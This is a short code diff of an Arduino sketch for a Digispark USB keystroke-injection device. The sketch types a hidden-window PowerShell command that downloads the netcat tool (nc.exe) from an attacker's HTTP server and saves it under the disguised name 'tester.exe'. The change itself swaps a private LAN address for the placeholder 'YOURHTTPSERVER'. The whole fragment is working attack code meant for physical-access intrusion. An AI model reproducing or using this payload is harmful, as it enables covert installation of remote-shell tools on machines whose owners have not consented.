@@ -52,7 +52,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
-  DigiKeyboard.println("powershell -windowstyle hidden Invoke-WebRequest -Uri http://192.168.0.192/nc.exe -OutFile tester.exe");
+  DigiKeyboard.println("powershell -windowstyle hidden Invoke-WebRequest -Uri http://YOURHTTPSERVER/nc.exe -OutFile tester.exe");
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
